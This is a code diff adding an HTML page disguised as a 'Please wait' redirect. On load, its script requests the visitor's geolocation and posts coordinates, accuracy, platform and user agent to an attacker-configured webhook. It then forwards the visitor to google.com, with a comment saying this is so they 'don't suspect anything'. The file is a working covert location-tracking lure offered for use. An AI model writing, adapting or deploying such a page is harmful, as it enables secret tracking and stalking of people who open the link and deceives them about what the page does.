@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirecting...</title>
+</head>
+<body>
+    <p>Please wait while the page loads...</p>
+
+    <script>
+        // Use a Webhook URL (like from Webhook.site) to test quickly
+        const your_webhook_url = "YOUR_WEBHOOK_URL_HERE";
+
+        function sendLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const data = {
+                        lat: position.coords.latitude,
+                        long: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        platform: navigator.platform,
+                        userAgent: navigator.userAgent
+                    };
+
+                    // Send the data to your server/webhook
+                    fetch(your_webhook_url, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify(data)
+                    }).then(() => {
+                        // Redirect them to a real site so they don't suspect anything
+                        window.location.href = "https://www.google.com";
+                    });
+                }, function(error) {
+                    // If they deny permission, you can still log the error or redirect
+                    window.location.href = "https://www.google.com";
+                });
+            }
+        }
+
+        window.onload = sendLocation;
+    </script>
+</body>
+</html>
